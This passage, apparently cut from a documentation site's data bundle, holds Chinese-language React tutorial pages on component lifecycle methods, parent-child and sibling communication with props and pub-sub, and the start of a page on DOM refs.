name=\'allcky\'/>,document.queryselector("#app"));\n<\/script>\n\n\n# 逻辑运算符 ||\n\n\n<script async src="//jsrun.pro/yahkp/embed/js,html,result/light/">\nclass hello extends react.component{\n    render(){\n        return <div>hello,{this.props.name||"houningzhou"}</div>\n    }\n}\nreactdom.render(<hello name=\'allcky\'/>,document.queryselector("#app"));\n<\/script>\n',charsets:{cjk:!0}},{title:"Lifecycle Methods",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/08-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",relativePath:"React/React基础/08-生命周期.md",key:"v-56e88d5a",path:"/React/React%E5%9F%BA%E7%A1%80/08-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",headers:[{level:2,title:"组件生命周期(V16.4)",slug:"组件生命周期-v16-4",normalizedTitle:"组件生命周期(v16.4)",charIndex:366},{level:2,title:"初始化阶段执行",slug:"初始化阶段执行",normalizedTitle:"初始化阶段执行",charIndex:453},{level:3,title:"constructor",slug:"constructor",normalizedTitle:"constructor",charIndex:664},{level:3,title:"static getDerivedStateFromProps(nextProps, prevState)",slug:"static-getderivedstatefromprops-nextprops-prevstate",normalizedTitle:"static getderivedstatefromprops(nextprops, prevstate)",charIndex:753},{level:3,title:"render()",slug:"render",normalizedTitle:"render()",charIndex:850},{level:3,title:"componentDidMount()",slug:"componentdidmount",normalizedTitle:"componentdidmount()",charIndex:1051},{level:2,title:"运行中阶段执行",slug:"运行中阶段执行",normalizedTitle:"运行中阶段执行",charIndex:2926},{level:3,title:"shouldComponentUpdate",slug:"shouldcomponentupdate",normalizedTitle:"shouldcomponentupdate",charIndex:3163},{level:3,title:"componentDidUpdate",slug:"componentdidupdate",normalizedTitle:"componentdidupdate",charIndex:3647},{level:2,title:"卸载阶段",slug:"卸载阶段",normalizedTitle:"卸载阶段",charIndex:4386},{level:2,title:"生命周期功能替换一览",slug:"生命周期功能替换一览",normalizedTitle:"生命周期功能替换一览",charIndex:4817}],headersStr:"组件生命周期(V16.4) 初始化阶段执行 constructor static getDerivedStateFromProps(nextProps, prevState) render() componentDidMount() 运行中阶段执行 shouldComponentUpdate componentDidUpdate 卸载阶段 生命周期功能替换一览",content:"# Lifecycle Methods\n\n> V16.3版本的react对组件的生命周期函数进行了一些修改\n> 对于任何一个框架，或者组件而言，都有其生命周期的定义，比如从定义到销毁，会有一定的流程在其中控制。\n\n生命周期就是指一个对象的生老病死。 生命周期（Life Cycle）的概念应用在各行各业中。广义上来说泛指自然界和人类社会各种客观事物的阶段性变化及其规律。自然界的生命周期，可以划分为出生、生长、成熟、衰老、死亡。不同体系中的生命周期都是从上述规律中演变而来，运用到了软件开发这个行业中。\n\nReact组件的生命周期分为三个阶段：初始化、运行中和销毁这三个阶段。开始使用组件初始化，组件需要更新 运行中，组件不需要用销毁。React在每个生命周期阶段都给我们提供了对应的钩子函数，以此来完成一些更高级的组件。\n\n\n# 组件生命周期(V16.4)\n\n> 参考： http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/\n\n\n# 初始化阶段执行\n\n当组件实例被创建并插入 DOM 中时，其生命周期调用顺序如下：\n\n序号   方法                                                      重要性   描述\n1    static defaultProps                                           获取默认属性，只调用一次(创建类的时候有且调用一次)\n2    constructor                                                   react组件的构造函数在挂载之前被调用。\n3    static getDerivedStateFromProps(nextProps, prevState)         在组件实例化后，接受新的props后，状态修改后会被调用。\n4    render()                                                      ** 唯一必须添加的方法 **\n                                                                   ,被调用时，组件在render函数生成虚拟节点，最后由react将虚拟节点变成真正的节点渲染到页面上\n5    componentDidMount()                                           组件被装载后才会被调用\n\n\n# constructor\n\n如果不初始化 state 或不进行方法绑定，则不需要为 React 组件实现构造函数。\n\n在 React 组件挂载之前，会调用它的构造函数。在为 React.Component 子类实现构造函数时，应在其他语句之前前调用 super(props)。否则，this.props 在构造函数中可能会出现未定义的 bug。\n\n通常，在 React 中，构造函数仅用于以下两种情况：\n\n * 通过给 this.state 赋值对象来初始化内部 state。\n * 为事件处理函数绑定实例\n\nclass Test extends React.Component{\n    constructor(props){\n        super(props);\n\n        //初始化内部 state\n        this.state = {};\n\n        //为事件处理函数绑定实例 修复事件处理程序this指向\n        this.handleChange = this.handleChange.bind(this);\n    }\n}\n\n\n> 注意： 在 constructor() 函数中不要调用 setState() 方法。如果你的组件需要使用内部 state，请直接在构造函数中为 this.state 赋值初始 state：\n\n\n# static getDerivedStateFromProps(nextProps, prevState)\n\n这个方法将会在组件实例化和接收到新的 props 的时候被调用。可以看出，当组件实例化的时候，这个方法替代了componentWillMount()，而当接收到新的 props 时，该方法替代了 componentWillReceiveProps() 和 componentWillUpdate()。\n\n> 注意: 这个方法是个 static 的方法，因此使用 this 在这个方法中并不指代本组件，如果打印出来会发现这个this是null。 而且这个方法有返回值。当需要更新状态时，需要返回一个state object(没有新增该状态，有更改指定状态)，如果不需要任何更新，则返回null即可。\n\n\n# render()\n\nrender() 方法是 class 组件中唯一必须实现的方法。当 render 被调用时，它会检查 this.props 和 this.state 的变化并返回以下类型之一：\n\n * React 元素。通常通过 JSX 创建。例如，<div /> 会被 React 渲染为 DOM 节点，<MyComponent /> 会被 React 渲染为自定义组件，无论是 <div /> 还是 <MyComponent /> 均为 React 元素。\n * 数组或 fragments。 使得 render 方法可以返回多个元素。欲了解更多详细信息，请参阅 fragments 文档。\n * Portals。可以渲染子节点到不同的 DOM 子树中。欲了解更多详细信息，请参阅有关 portals 的文档\n * 字符串或数值类型。它们在 DOM 中会被渲染为文本节点\n * 布尔类型或 null。什么都不渲染。（主要用于支持返回 test && 的模式，其中 test 为布尔类型。)\n\nrender() 函数应该为纯函数，这意味着在不修改组件 state 的情况下，每次调用时都返回相同的结果，并且它不会直接与浏览器交互。\n\n\n# componentDidMount()\n\ncomponentDidMount() 会在组件挂载后（插入 DOM 树中）立即调用。依赖于 DOM 节点的初始化应该放在这里。如需通过网络请求获取数据，此处是实例化请求的好地方。\n\n由于这个方法发生在render()之后，因此在这个方法中调用setState()会导致一次额外的渲染，只不过这次渲染会发生在浏览器更新屏幕之前。因此即使渲染了两次，用户也不会看到中间状态，即不会有那种状态突然跳一下的情况发生。对于像modals和tooltips这种需要在渲染前知道尺寸大小、位置的情况来说，也是很有用。只不过，虽然在用户视觉体验上可能没有影响，但是这种操作可能会导致性能方面的问题，因此还需慎用。\n\n\n# 运行中阶段执行\n\n当组件的 props 或 state 发生变化时会触发组件的更新，组件重新渲染的过程中生命周期调用顺序如下：\n\n序号   方法                                                      重要性   描述\n1    static getDerivedStateFromProps(nextProps, prevState)         在组件实例化后，接受新的props后，状态修改后会被调用。\n2    shouldComponentUpdate()                                       返回一个布尔值。在组件接收到新的props或者state时被调用。\n                                                                   可以在你确认不需要更新组件时使用。(nextProps,nextState)\n3    render()                                                      ** 唯一必须添加的方法 **\n                                                                   ，组件在render函数生成虚拟节点，最后由react将虚拟节点变成真正的节点渲染到页面上\n4    getSnapshotBeforeUpdate(prevProps, prevState)                 在更新之前被调用(不常用)\n5    componentDidUpdate()                                          真正的DOM被渲染之后调用\n\n\n# shouldComponentUpdate\n\n根据 shouldComponentUpdate() 的返回值，判断 React 组件的输出是否受当前 state 或 props 更改的影响。默认行为是 state 每次发生变化组件都会重新渲染。大部分情况下，你应该遵循默认行为。\n\n当 props 或 state 发生变化时，shouldComponentUpdate() 会在渲染执行之前被调用。返回值默认为 true。首次渲染或使用 forceUpdate() 时不会调用该方法。\n\nclass Test extends React.Component{\n    shouldComponentUpdate(nextProps, nextState)\n        //other code\n        return true|false;\n    }   \n}\n\n\n\n# componentDidUpdate\n\n当组件更新后，可以在此处对 DOM 进行操作。如果你对更新前后的 props 进行了比较，也可以选择在此处进行网络请求。（例如，当 props 未发生变化时，则不会执行网络请求）。\n\ncomponentDidUpdate(prevProps) {\n  // 典型用法（不要忘记比较 props）：\n  if (this.props.userID !== prevProps.userID) {\n    this.fetchData(this.props.userID);\n  }\n}\n\n\n\n# 卸载阶段\n\n序号   方法                     重要性   描述\n1    componentWillUnmount         这个函数在销毁操作真正执行之前调用，给开发者最后的机会进行一些清理工作\n\ncomponentWillUnmount() 会在组件卸载及销毁之前直接调用。在此方法中执行必要的清理操作，例如，清除 timer，取消网络请求或清除在 componentDidMount() 中创建的订阅等。\n\nclass App extends React.Component{\n    componentWillUnmount(){\n        //组件将要卸载的调用\n    }\n    render(){\n        return (<div>Hello!<div>)\n    }\n}\n\n\n在componentWillUnmount方法中，我们通常会执行一些清理操作，例如：移除事件处理程序或者清除定时器。\n\n\n# 生命周期功能替换一览\n\nclass Test extends React.Component{\n    初始化属性\n    static defaultProps = {}\n\n    constructor(props) {\n        super(props);\n        1. 初始化状态\n        this.state = {}\n        2. 修改事件处理程序 this指向\n    }\n\n    static getDerivedStateFromProps(nextProps, prevState) {\n        1. 基于属性更新状态\n        2. 属性变化时获取外部数据\n        return null | {}\n    }\n\n    render() {\n    }\n\n    componentDidMount(){\n        1. DOM操作\n        2. 从服务器获取数据\n    }\n\n    shouldComponentUpdate() {\n        决定组件是否更新\n        return ture|false\n    }\n\n    getSnapshotBeforeUpdate(prevProps, prevState) {\n        在更新之前读取DOM属性\n        类似于快照 'snapshot' 为传递给componentDidUpdate 的 snapshot 参数\n\n        return snapshot\n    }\n\n    componentDidUpdate(prevProps, prevState, snapshot) {\n        snapshot 为上一个生命周期 getSnapshotBeforeUpdate return 的参数\n    }\n\n    componentWillUnmount() {\n        1. 做一些清理工作，如事件绑定、定时器\n    }\n}\n",normalizedContent:"# lifecycle methods\n\n> v16.3版本的react对组件的生命周期函数进行了一些修改\n> 对于任何一个框架，或者组件而言，都有其生命周期的定义，比如从定义到销毁，会有一定的流程在其中控制。\n\n生命周期就是指一个对象的生老病死。 生命周期（life cycle）的概念应用在各行各业中。广义上来说泛指自然界和人类社会各种客观事物的阶段性变化及其规律。自然界的生命周期，可以划分为出生、生长、成熟、衰老、死亡。不同体系中的生命周期都是从上述规律中演变而来，运用到了软件开发这个行业中。\n\nreact组件的生命周期分为三个阶段：初始化、运行中和销毁这三个阶段。开始使用组件初始化，组件需要更新 运行中，组件不需要用销毁。react在每个生命周期阶段都给我们提供了对应的钩子函数，以此来完成一些更高级的组件。\n\n\n# 组件生命周期(v16.4)\n\n> 参考： http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/\n\n\n# 初始化阶段执行\n\n当组件实例被创建并插入 dom 中时，其生命周期调用顺序如下：\n\n序号   方法                                                      重要性   描述\n1    static defaultprops                                           获取默认属性，只调用一次(创建类的时候有且调用一次)\n2    constructor                                                   react组件的构造函数在挂载之前被调用。\n3    static getderivedstatefromprops(nextprops, prevstate)         在组件实例化后，接受新的props后，状态修改后会被调用。\n4    render()                                                      ** 唯一必须添加的方法 **\n                                                                   ,被调用时，组件在render函数生成虚拟节点，最后由react将虚拟节点变成真正的节点渲染到页面上\n5    componentdidmount()                                           组件被装载后才会被调用\n\n\n# constructor\n\n如果不初始化 state 或不进行方法绑定，则不需要为 react 组件实现构造函数。\n\n在 react 组件挂载之前，会调用它的构造函数。在为 react.component 子类实现构造函数时，应在其他语句之前前调用 super(props)。否则，this.props 在构造函数中可能会出现未定义的 bug。\n\n通常，在 react 中，构造函数仅用于以下两种情况：\n\n * 通过给 this.state 赋值对象来初始化内部 state。\n * 为事件处理函数绑定实例\n\nclass test extends react.component{\n    constructor(props){\n        super(props);\n\n        //初始化内部 state\n        this.state = {};\n\n        //为事件处理函数绑定实例 修复事件处理程序this指向\n        this.handlechange = this.handlechange.bind(this);\n    }\n}\n\n\n> 注意： 在 constructor() 函数中不要调用 setstate() 方法。如果你的组件需要使用内部 state，请直接在构造函数中为 this.state 赋值初始 state：\n\n\n# static getderivedstatefromprops(nextprops, prevstate)\n\n这个方法将会在组件实例化和接收到新的 props 的时候被调用。可以看出，当组件实例化的时候，这个方法替代了componentwillmount()，而当接收到新的 props 时，该方法替代了 componentwillreceiveprops() 和 componentwillupdate()。\n\n> 注意: 这个方法是个 static 的方法，因此使用 this 在这个方法中并不指代本组件，如果打印出来会发现这个this是null。 而且这个方法有返回值。当需要更新状态时，需要返回一个state object(没有新增该状态，有更改指定状态)，如果不需要任何更新，则返回null即可。\n\n\n# render()\n\nrender() 方法是 class 组件中唯一必须实现的方法。当 render 被调用时，它会检查 this.props 和 this.state 的变化并返回以下类型之一：\n\n * react 元素。通常通过 jsx 创建。例如，<div /> 会被 react 渲染为 dom 节点，<mycomponent /> 会被 react 渲染为自定义组件，无论是 <div /> 还是 <mycomponent /> 均为 react 元素。\n * 数组或 fragments。 使得 render 方法可以返回多个元素。欲了解更多详细信息，请参阅 fragments 文档。\n * portals。可以渲染子节点到不同的 dom 子树中。欲了解更多详细信息，请参阅有关 portals 的文档\n * 字符串或数值类型。它们在 dom 中会被渲染为文本节点\n * 布尔类型或 null。什么都不渲染。（主要用于支持返回 test && 的模式，其中 test 为布尔类型。)\n\nrender() 函数应该为纯函数，这意味着在不修改组件 state 的情况下，每次调用时都返回相同的结果，并且它不会直接与浏览器交互。\n\n\n# componentdidmount()\n\ncomponentdidmount() 会在组件挂载后（插入 dom 树中）立即调用。依赖于 dom 节点的初始化应该放在这里。如需通过网络请求获取数据，此处是实例化请求的好地方。\n\n由于这个方法发生在render()之后，因此在这个方法中调用setstate()会导致一次额外的渲染，只不过这次渲染会发生在浏览器更新屏幕之前。因此即使渲染了两次，用户也不会看到中间状态，即不会有那种状态突然跳一下的情况发生。对于像modals和tooltips这种需要在渲染前知道尺寸大小、位置的情况来说，也是很有用。只不过，虽然在用户视觉体验上可能没有影响，但是这种操作可能会导致性能方面的问题，因此还需慎用。\n\n\n# 运行中阶段执行\n\n当组件的 props 或 state 发生变化时会触发组件的更新，组件重新渲染的过程中生命周期调用顺序如下：\n\n序号   方法                                                      重要性   描述\n1    static getderivedstatefromprops(nextprops, prevstate)         在组件实例化后，接受新的props后，状态修改后会被调用。\n2    shouldcomponentupdate()                                       返回一个布尔值。在组件接收到新的props或者state时被调用。\n                                                                   可以在你确认不需要更新组件时使用。(nextprops,nextstate)\n3    render()                                                      ** 唯一必须添加的方法 **\n                                                                   ，组件在render函数生成虚拟节点，最后由react将虚拟节点变成真正的节点渲染到页面上\n4    getsnapshotbeforeupdate(prevprops, prevstate)                 在更新之前被调用(不常用)\n5    componentdidupdate()                                          真正的dom被渲染之后调用\n\n\n# shouldcomponentupdate\n\n根据 shouldcomponentupdate() 的返回值，判断 react 组件的输出是否受当前 state 或 props 更改的影响。默认行为是 state 每次发生变化组件都会重新渲染。大部分情况下，你应该遵循默认行为。\n\n当 props 或 state 发生变化时，shouldcomponentupdate() 会在渲染执行之前被调用。返回值默认为 true。首次渲染或使用 forceupdate() 时不会调用该方法。\n\nclass test extends react.component{\n    shouldcomponentupdate(nextprops, nextstate)\n        //other code\n        return true|false;\n    }   \n}\n\n\n\n# componentdidupdate\n\n当组件更新后，可以在此处对 dom 进行操作。如果你对更新前后的 props 进行了比较，也可以选择在此处进行网络请求。（例如，当 props 未发生变化时，则不会执行网络请求）。\n\ncomponentdidupdate(prevprops) {\n  // 典型用法（不要忘记比较 props）：\n  if (this.props.userid !== prevprops.userid) {\n    this.fetchdata(this.props.userid);\n  }\n}\n\n\n\n# 卸载阶段\n\n序号   方法                     重要性   描述\n1    componentwillunmount         这个函数在销毁操作真正执行之前调用，给开发者最后的机会进行一些清理工作\n\ncomponentwillunmount() 会在组件卸载及销毁之前直接调用。在此方法中执行必要的清理操作，例如，清除 timer，取消网络请求或清除在 componentdidmount() 中创建的订阅等。\n\nclass app extends react.component{\n    componentwillunmount(){\n        //组件将要卸载的调用\n    }\n    render(){\n        return (<div>hello!<div>)\n    }\n}\n\n\n在componentwillunmount方法中，我们通常会执行一些清理操作，例如：移除事件处理程序或者清除定时器。\n\n\n# 生命周期功能替换一览\n\nclass test extends react.component{\n    初始化属性\n    static defaultprops = {}\n\n    constructor(props) {\n        super(props);\n        1. 初始化状态\n        this.state = {}\n        2. 修改事件处理程序 this指向\n    }\n\n    static getderivedstatefromprops(nextprops, prevstate) {\n        1. 基于属性更新状态\n        2. 属性变化时获取外部数据\n        return null | {}\n    }\n\n    render() {\n    }\n\n    componentdidmount(){\n        1. dom操作\n        2. 从服务器获取数据\n    }\n\n    shouldcomponentupdate() {\n        决定组件是否更新\n        return ture|false\n    }\n\n    getsnapshotbeforeupdate(prevprops, prevstate) {\n        在更新之前读取dom属性\n        类似于快照 'snapshot' 为传递给componentdidupdate 的 snapshot 参数\n\n        return snapshot\n    }\n\n    componentdidupdate(prevprops, prevstate, snapshot) {\n        snapshot 为上一个生命周期 getsnapshotbeforeupdate return 的参数\n    }\n\n    componentwillunmount() {\n        1. 做一些清理工作，如事件绑定、定时器\n    }\n}\n",charsets:{cjk:!0}},{title:"React组件沟通",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/10-React%E7%BB%84%E4%BB%B6%E6%B2%9F%E9%80%9A.html",relativePath:"React/React基础/10-React组件沟通.md",key:"v-62e6c142",path:"/React/React%E5%9F%BA%E7%A1%80/10-React%E7%BB%84%E4%BB%B6%E6%B2%9F%E9%80%9A.html",headers:[{level:2,title:"父子组件沟通",slug:"父子组件沟通",normalizedTitle:"父子组件沟通",charIndex:149},{level:3,title:"父组件更新组件状态",slug:"父组件更新组件状态",normalizedTitle:"父组件更新组件状态",charIndex:179},{level:3,title:"子组件更新父组件状态",slug:"子组件更新父组件状态",normalizedTitle:"子组件更新父组件状态",charIndex:1814},{level:2,title:"兄弟组件沟通",slug:"兄弟组件沟通",normalizedTitle:"兄弟组件沟通",charIndex:2848},{level:3,title:"组件间的关系：",slug:"组件间的关系",normalizedTitle:"组件间的关系：",charIndex:3837},{level:3,title:"几种通信方式：",slug:"几种通信方式",normalizedTitle:"几种通信方式：",charIndex:3887},{level:3,title:"比较好的搭配方式：",slug:"比较好的搭配方式",normalizedTitle:"比较好的搭配方式：",charIndex:4030},{level:2,title:"消息订阅-发布 （类似于vue $emit）",slug:"消息订阅-发布-类似于vue-emit",normalizedTitle:"消息订阅-发布 （类似于vue $emit）",charIndex:4127}],headersStr:"父子组件沟通 父组件更新组件状态 子组件更新父组件状态 兄弟组件沟通 组件间的关系： 几种通信方式： 比较好的搭配方式： 消息订阅-发布 （类似于vue $emit）",content:"# React组件沟通\n\nReact 是以组合组件的形式组织的，组件因为彼此是相互独立的，从传递信息的内容上看，几乎所有类型的信息都可以实现传递，例如字符串、数组、对象、方法或自定义组件等。所以，在嵌套关系上，就会有两种不同的可能性：父组件向子组件通信、子组件向父组件通信、兄弟组件通信。\n\n\n# 父子组件沟通\n\n这种方式是最常见的，也是最简单的。\n\n\n# 父组件更新组件状态\n\n父组件更新子组件状态，通过传递props，就可以了。\n\nclass ColorCard extends React.Component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            color: '#009494'\n        }\n    }\n    render() {\n        var colorStyle = {\n            height: 200,\n            width: 150,\n            padding: 0,\n            backgroundColor: \"#FFF\",\n            WebkitFilter: \"drop-shadow(0px 0px 5px #666)\",\n            filter: \"drop-shadow(0px 0px 5px #666)\"\n        }\n        return ( < div style = {\n                colorStyle\n            } >\n            <\n            Color color = {\n                this.state.color\n            }\n            /> <\n            Label color = {\n                this.state.color\n            }\n            /> < /\n            div > );\n    }\n    componentDidMount() {\n        var that = this;\n        setTimeout(function() {\n            that.setState({\n                color: '#ff0033'\n            })\n        }, 10000)\n    }\n}\n\nclass Color extends React.Component {\n    render() {\n        var colorStyle = {\n            height: '150px',\n            width: '150px',\n            backgroundColor: this.props.color\n        }\n        return <div style = {\n            colorStyle\n        } > < /div>\n    }\n}\nclass Label extends React.Component {\n    render() {\n        var labelStyle = {\n            fontFamily: \"sans-serif\",\n            fontWeight: \"bold\",\n            padding: 13,\n            margin: 0\n        };\n        return <div style = {\n            labelStyle\n        } > {\n            this.props.color\n        } < /div>\n    }\n}\nReactDOM.render( < ColorCard / > , document.querySelector('#box'));\n\n\n\n# 子组件更新父组件状态\n\n这种情况需要父组件传递回调函数给子组件，子组件调用触发即可。\n\nclass Child extends React.Component {\n    handleClick() {\n        this.props.handleChangeName(this.refs.text.value);\n    }\n    render() {\n\n        return ( < div >\n            <\n            input type = 'text'\n            ref = \"text\" / >\n            <\n            button onClick = {\n                this.handleClick.bind(this)\n            } > 提交 < /button> < /\n            div > );\n    }\n}\nclass Parent extends React.Component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            text: 'everyone'\n        }\n    }\n    handleChangeName(name) {\n        this.setState({\n            text: name\n        })\n    }\n    render() {\n        return ( < div >\n            <\n            p > hello, {\n                this.state.text\n            } < /p> <\n            Child handleChangeName = {\n                this.handleChangeName.bind(this)\n            }\n            /> < /\n            div > )\n    }\n}\nReactDOM.render( < Parent / > , document.querySelector('#box'));\n\n\n\n# 兄弟组件沟通\n\n当两个组件有相同的父组件时，就称为兄弟组件。按照React单向数据流方式，我们需要借助父组件进行传递，通过父组件回调函数改变兄弟组件的props。\n\nclass Parent extends React.Component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            text: ''\n        }\n    }\n    changeText() {\n        this.setState({\n            text: '兄弟组件修改成功'\n        })\n    }\n    render() {\n        return ( < div >\n            <\n            Brother1 changeText = {\n                this.changeText.bind(this)\n            }\n            /> <\n            Brother2 text = {\n                this.state.text\n            }\n            /> < /\n            div > )\n    }\n}\n\nclass Brother1 extends React.Component {\n    render() {\n        return <button onClick = {\n            this.props.changeText\n        } > 修改兄弟节点 < /button>\n    }\n}\n\nclass Brother2 extends React.Component {\n    render() {\n        return <button > {\n            this.props.text || '未修改'\n        } < /button>\n    }\n}\n\nReactDOM.render( < Parent / > , document.querySelector('#box'))\n\n\n\n# 组件间的关系：\n\n * 父子组件\n * 兄弟组件（非嵌套组件）\n * 祖孙组件（跨级组件）\n\n\n# 几种通信方式：\n\n\t1.props：\n\t\t(1).children props\n\t\t(2).render props\n\t2.消息订阅-发布：\n\t\tpubs-sub、event等等\n\t3.集中式管理：\n\t\tredux、dva等等\n\t4.conText:\n\t\t生产者-消费者模式\n\n\n\n# 比较好的搭配方式：\n\n\t父子组件：props\n\t兄弟组件：消息订阅-发布、集中式管理\n\t祖孙组件(跨级组件)：消息订阅-发布、集中式管理、conText(开发用的少，封装插件用的多)\n\n\n\n# 消息订阅-发布 （类似于vue $emit）\n\n    // npm 安装pubsub-js\n    // npm install 'pubsub-js'--save\n\n    import PubSub from 'pubsub-js' //引入\n    class Parent extends React.Component {\n        constructor(props) {\n            super(props);\n            this.state = {\n                text: ''\n            }\n        }\n        changeText() {\n            this.setState({\n                text: '兄弟组件修改成功'\n            })\n        }\n        render() {\n            return \n            ( \n            <div>\n                < Brother1 /> \n                <Brother2 /> \n            </div> \n            )\n               \n        }\n    }\n\n    class Brother1 extends React.Component {\n        changeText=()=>{\n            let data={}\n          PubSub.publish('update', data) //发布消息\n        }\n        render() {\n            return <button onClick = {\n                this.changeText\n            } > 修改兄弟节点 < /button>\n        }\n    }\n\n    class Brother2 extends React.Component {\n        state={\n\n        }\n        componentDidMount(){\n            this.token=PubSub.subscribe('update', function(data){  //订阅消息\n                console.log(data)\n            }); //订阅\n         }\n        componentWillUnmount(){\n            PushSub.unsubscribe(this.token)\n        }\n            render() {\n                return <button > {\n                    this.props.text || '未修改'\n                } < /button>\n            }\n        }\n\n    ReactDOM.render( < Parent / > , document.querySelector('#box'))\n",normalizedContent:"# react组件沟通\n\nreact 是以组合组件的形式组织的，组件因为彼此是相互独立的，从传递信息的内容上看，几乎所有类型的信息都可以实现传递，例如字符串、数组、对象、方法或自定义组件等。所以，在嵌套关系上，就会有两种不同的可能性：父组件向子组件通信、子组件向父组件通信、兄弟组件通信。\n\n\n# 父子组件沟通\n\n这种方式是最常见的，也是最简单的。\n\n\n# 父组件更新组件状态\n\n父组件更新子组件状态，通过传递props，就可以了。\n\nclass colorcard extends react.component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            color: '#009494'\n        }\n    }\n    render() {\n        var colorstyle = {\n            height: 200,\n            width: 150,\n            padding: 0,\n            backgroundcolor: \"#fff\",\n            webkitfilter: \"drop-shadow(0px 0px 5px #666)\",\n            filter: \"drop-shadow(0px 0px 5px #666)\"\n        }\n        return ( < div style = {\n                colorstyle\n            } >\n            <\n            color color = {\n                this.state.color\n            }\n            /> <\n            label color = {\n                this.state.color\n            }\n            /> < /\n            div > );\n    }\n    componentdidmount() {\n        var that = this;\n        settimeout(function() {\n            that.setstate({\n                color: '#ff0033'\n            })\n        }, 10000)\n    }\n}\n\nclass color extends react.component {\n    render() {\n        var colorstyle = {\n            height: '150px',\n            width: '150px',\n            backgroundcolor: this.props.color\n        }\n        return <div style = {\n            colorstyle\n        } > < /div>\n    }\n}\nclass label extends react.component {\n    render() {\n        var labelstyle = {\n            fontfamily: \"sans-serif\",\n            fontweight: \"bold\",\n            padding: 13,\n            margin: 0\n        };\n        return <div style = {\n            labelstyle\n        } > {\n            this.props.color\n        } < /div>\n    }\n}\nreactdom.render( < colorcard / > , document.queryselector('#box'));\n\n\n\n# 子组件更新父组件状态\n\n这种情况需要父组件传递回调函数给子组件，子组件调用触发即可。\n\nclass child extends react.component {\n    handleclick() {\n        this.props.handlechangename(this.refs.text.value);\n    }\n    render() {\n\n        return ( < div >\n            <\n            input type = 'text'\n            ref = \"text\" / >\n            <\n            button onclick = {\n                this.handleclick.bind(this)\n            } > 提交 < /button> < /\n            div > );\n    }\n}\nclass parent extends react.component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            text: 'everyone'\n        }\n    }\n    handlechangename(name) {\n        this.setstate({\n            text: name\n        })\n    }\n    render() {\n        return ( < div >\n            <\n            p > hello, {\n                this.state.text\n            } < /p> <\n            child handlechangename = {\n                this.handlechangename.bind(this)\n            }\n            /> < /\n            div > )\n    }\n}\nreactdom.render( < parent / > , document.queryselector('#box'));\n\n\n\n# 兄弟组件沟通\n\n当两个组件有相同的父组件时，就称为兄弟组件。按照react单向数据流方式，我们需要借助父组件进行传递，通过父组件回调函数改变兄弟组件的props。\n\nclass parent extends react.component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            text: ''\n        }\n    }\n    changetext() {\n        this.setstate({\n            text: '兄弟组件修改成功'\n        })\n    }\n    render() {\n        return ( < div >\n            <\n            brother1 changetext = {\n                this.changetext.bind(this)\n            }\n            /> <\n            brother2 text = {\n                this.state.text\n            }\n            /> < /\n            div > )\n    }\n}\n\nclass brother1 extends react.component {\n    render() {\n        return <button onclick = {\n            this.props.changetext\n        } > 修改兄弟节点 < /button>\n    }\n}\n\nclass brother2 extends react.component {\n    render() {\n        return <button > {\n            this.props.text || '未修改'\n        } < /button>\n    }\n}\n\nreactdom.render( < parent / > , document.queryselector('#box'))\n\n\n\n# 组件间的关系：\n\n * 父子组件\n * 兄弟组件（非嵌套组件）\n * 祖孙组件（跨级组件）\n\n\n# 几种通信方式：\n\n\t1.props：\n\t\t(1).children props\n\t\t(2).render props\n\t2.消息订阅-发布：\n\t\tpubs-sub、event等等\n\t3.集中式管理：\n\t\tredux、dva等等\n\t4.context:\n\t\t生产者-消费者模式\n\n\n\n# 比较好的搭配方式：\n\n\t父子组件：props\n\t兄弟组件：消息订阅-发布、集中式管理\n\t祖孙组件(跨级组件)：消息订阅-发布、集中式管理、context(开发用的少，封装插件用的多)\n\n\n\n# 消息订阅-发布 （类似于vue $emit）\n\n    // npm 安装pubsub-js\n    // npm install 'pubsub-js'--save\n\n    import pubsub from 'pubsub-js' //引入\n    class parent extends react.component {\n        constructor(props) {\n            super(props);\n            this.state = {\n                text: ''\n            }\n        }\n        changetext() {\n            this.setstate({\n                text: '兄弟组件修改成功'\n            })\n        }\n        render() {\n            return \n            ( \n            <div>\n                < brother1 /> \n                <brother2 /> \n            </div> \n            )\n               \n        }\n    }\n\n    class brother1 extends react.component {\n        changetext=()=>{\n            let data={}\n          pubsub.publish('update', data) //发布消息\n        }\n        render() {\n            return <button onclick = {\n                this.changetext\n            } > 修改兄弟节点 < /button>\n        }\n    }\n\n    class brother2 extends react.component {\n        state={\n\n        }\n        componentdidmount(){\n            this.token=pubsub.subscribe('update', function(data){  //订阅消息\n                console.log(data)\n            }); //订阅\n         }\n        componentwillunmount(){\n            pushsub.unsubscribe(this.token)\n        }\n            render() {\n                return <button > {\n                    this.props.text || '未修改'\n                } < /button>\n            }\n        }\n\n    reactdom.render( < parent / > , document.queryselector('#box'))\n",charsets:{cjk:!0}},{title:"DOM 操作",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/06-DOM%E6%93%8D%E4%BD%9C.html",relativePath:"React/React基础/06-DOM操作.md",key:"v-7daac0ba",path:"/React/React%E5%9F%BA%E7%A1%80/06-DOM%E6%93%8D%E4%BD%9C.html",headers:[{level:3,title:"获取DOM元素",slug:"获取dom元素",normalizedTitle:"获取dom元素",charIndex:138},{level:2,title:"Refs",slug:"refs",normalizedTitle:"refs",charIndex:213},{level:3,title:"String 类型的 Refs",slug:"string-类型的-refs",normalizedTitle:"string 类型的 refs",charIndex:410},{level:3,title:"回调 Refs",slug:"回调-refs",normalizedTitle:"回调 refs",charIndex:445},{level:3,title:"React.createRef()",slug:"react-createref",normalizedTitle:"react.createref()",charIndex:456},{level:2,title:"findDOMNode",slug:"finddomnode",normalizedTitle:"finddomnode",charIndex:195}],headersStr:"获取DOM元素 Refs String 类型的 Refs 回调 Refs React.createRef() findDOMNode",content:"# DOM 操作\n\n多数情况下，React的虚拟DOM足以满足我们的需求，不需要直接操作底层真实的DOM。通过将组件组合使用，满足我们的需求。\n\n在某些特殊情况下，为了某些需求不得不去操作底层的DOM。最常见的场景使用一些插件、或要执行一个React没有支持的操作。\n\n\n# 